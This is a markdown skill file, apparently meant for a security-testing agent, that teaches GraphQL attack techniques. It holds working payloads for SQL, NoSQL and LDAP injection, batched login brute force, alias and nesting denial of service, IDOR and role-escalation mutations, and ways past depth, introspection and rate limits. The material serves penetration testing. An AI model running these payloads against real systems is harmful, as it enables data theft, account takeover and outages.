---
name: graphql_injection
description: GraphQL security testing covering introspection abuse, injection attacks, batching abuse, alias overloading, and authorization bypass
---

# GraphQL Injection

GraphQL APIs introduce unique attack surfaces beyond traditional REST vulnerabilities. Introspection, batching, aliases, and nested queries create opportunities for injection, DoS, and authorization bypass.

## Attack Surface

**Introspection**
- `__schema` and `__type` queries exposing full API structure
- Type names, field descriptions, deprecation reasons
- Enum values, input types, directives

**Query Structure**
- Nested object traversal (user → posts → comments → author)
- Aliases for parallel queries in single request
- Fragments for reusable query components
- Variables for parameterized queries
- Directives (`@include`, `@skip`) for conditional execution

**Batching**
- Multiple queries in single HTTP request (array of operations)
- Query batching at transport layer
- DataLoader batching at resolver layer

**Mutations**
- Side-effect operations (create, update, delete)
- Input validation at resolver level
- Transaction boundaries and rollback behavior

## Detection Channels

**Introspection Discovery**
```graphql
# Check if introspection is enabled
{
  __schema {
    types {
      name
    }
  }
}

# Get all queries
{
  __schema {
    queryType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}

# Get all mutations
{
  __schema {
    mutationType {
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

**Error-Based Detection**
- Send malformed query → observe error messages revealing field names
- Request non-existent field → error lists available fields
- Invalid enum value → error lists valid enum values
- Missing required argument → error reveals argument name and type

**Timing-Based Detection**
- Deep nesting → measure response time (DoS indicator)
- Alias overloading → measure response time
- Batch many queries → measure response time

## Exploitation Techniques

### Introspection Abuse

**Dump Full Schema**
```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name kind } }
      }
    }
  }
}
```

**Extract Sensitive Fields**
```graphql
# Look for admin/debug/internal fields
{
  __schema {
    types {
      name
      fields {
        name
        description
      }
    }
  }
}

# Common sensitive field names:
# - admin, debug, internal, private, secret
# - users, roles, permissions, tokens
# - config, settings, env, database
```

**Enumerate Enums**
```graphql
{
  __type(name: "UserRole") {
    enumValues {
      name
      description
    }
  }
}
```

### Injection Attacks

**SQL Injection in GraphQL**
```graphql
# Vulnerable resolver
query {
  user(id: "1' OR '1'='1") {
    name
    email
  }
}

# Union-based injection
query {
  user(id: "1 UNION SELECT username,password,3,4 FROM users--") {
    name
    email
  }
}
```

**NoSQL Injection**
```graphql
# MongoDB operator injection
query {
  user(filter: "{\"$where\": \"sleep(5000)\"}") {
    name
  }
}

# Or via variables
query GetUser($filter: String) {
  user(filter: $filter) {
    name
  }
}
# Variables: {"filter": {"$gt": ""}}
```

**LDAP Injection**
```graphql
query {
  user(dn: "*)(uid=*))(|(uid=*") {
    name
  }
}
```

### Batching Abuse

**Brute Force via Batching**
```json
[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"},
  ...1000 more...
]
```

**Enumeration via Batching**
```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"},
  ...enumerate all user IDs...
]
```

### Alias Overloading (DoS)

**Duplicate Queries**
```graphql
query {
  a1: user(id: 1) { name email posts { title } }
  a2: user(id: 1) { name email posts { title } }
  a3: user(id: 1) { name email posts { title } }
  ...1000 aliases...
}
```

**Nested Expansion**
```graphql
query {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                ...repeat 20 levels deep...
              }
            }
          }
        }
      }
    }
  }
}
```

### Authorization Bypass

**IDOR via GraphQL**
```graphql
# Access other user's data
query {
  user(id: "victim-user-id") {
    email
    phone
    address
  }
}

# Batch IDOR
[
  {"query": "{ user(id: \"user1\") { email } }"},
  {"query": "{ user(id: \"user2\") { email } }"},
  {"query": "{ user(id: \"user3\") { email } }"}
]
```

**Field-Level Authorization Bypass**
```graphql
# Request sensitive fields directly
query {
  me {
    name
    email
    ssn          # Should be restricted
    creditCard   # Should be restricted
    adminNotes   # Should be restricted
  }
}
```

**Mutation Authorization Bypass**
```graphql
# Attempt admin mutations as regular user
mutation {
  deleteUser(id: "victim-id") {
    success
  }
}

mutation {
  updateUserRole(userId: "my-id", role: ADMIN) {
    success
  }
}
```

## Advanced Techniques

**Query Cost Analysis Bypass**
```graphql
# If server limits query depth to 10, use aliases instead
query {
  a1: user(id: 1) { posts { comments { author { name } } } }
  a2: user(id: 2) { posts { comments { author { name } } } }
  ...100 aliases at depth 4 = 400 effective depth
}
```

**Fragment Abuse**
```graphql
# Define fragment once, use many times
fragment UserFields on User {
  name email phone address ssn creditCard
}

query {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
  ...1000 users...
}
```

**Directive Abuse**
```graphql
# Conditional execution based on variables
query GetData($includeSensitive: Boolean!) {
  user(id: 1) {
    name
    ssn @include(if: $includeSensitive)
    creditCard @include(if: $includeSensitive)
  }
}
# Variables: {"includeSensitive": true}
```

**Introspection via Aliases**
```graphql
# Bypass introspection blocks
query {
  s: __schema {
    t: types {
      n: name
    }
  }
}
```

## Bypass Techniques

**Bypass Depth Limits**
- Use aliases instead of nesting
- Use fragments to reuse deep structures
- Split across multiple batched queries

**Bypass Query Cost Analysis**
- Use many shallow queries instead of one deep query
- Batch multiple queries in single request
- Use variables to hide query structure

**Bypass Introspection Blocks**
- Use aliases: `s: __schema { ... }`
- Use fragments: `fragment F on __Schema { ... }`
- Try alternate introspection fields: `__type`, `__Type`

**Bypass Rate Limits**
- Batch queries in single request (counts as 1 request)
- Use aliases to multiply queries without new requests
- Distribute across multiple connections

## Validation

**Confirm Introspection**
- Schema dump returns type/field names
- Can enumerate all queries/mutations
- Can see field descriptions and deprecation reasons

**Confirm Injection**
- SQL injection: observe error messages or time delays
- NoSQL injection: observe different results with operators
- LDAP injection: observe different results with wildcards

**Confirm DoS**
- Response time > 10 seconds for alias overloading
- Server returns 503/504 or connection timeout
- CPU/memory spike on server (if observable)

**Confirm Authorization Bypass**
- Access data belonging to other users
- Execute admin mutations as regular user
- Access restricted fields (ssn, creditCard, adminNotes)

**Avoid False Positives**
- Introspection enabled ≠ vulnerability (check if sensitive data exposed)
- Slow query ≠ DoS (could be legitimate complex query)
- Error message ≠ injection (could be validation error)

## Impact

- **Information Disclosure**: Full schema exposure, sensitive data leakage
- **Injection Attacks**: SQL/NoSQL/LDAP injection via GraphQL resolvers
- **Denial of Service**: Query complexity abuse, alias overloading
- **Authorization Bypass**: IDOR, field-level bypass, mutation bypass
- **Brute Force**: Batch multiple login attempts in single request
- **Data Exfiltration**: Enumerate all users/records via batching

## Pro Tips

1. **Always check introspection first** - reveals full attack surface
2. **Use GraphQL introspection tools** - graphql-cli (npm install -g graphql-cli), curl with GraphQL queries, curl with GraphQL queries
3. **Test batching limits** - send 100, 1000, 10000 queries in batch
4. **Test depth limits** - nest 10, 20, 50 levels deep
5. **Test alias limits** - use 100, 1000 aliases in single query
6. **Check for query cost analysis** - measure if complex queries are rejected
7. **Test field-level authorization** - request sensitive fields directly
8. **Test mutation authorization** - attempt admin operations as regular user
9. **Look for debug/introspection endpoints** - `/graphql/debug`, `/graphiql`
10. **Use curl/httpx/Python scripts for testing
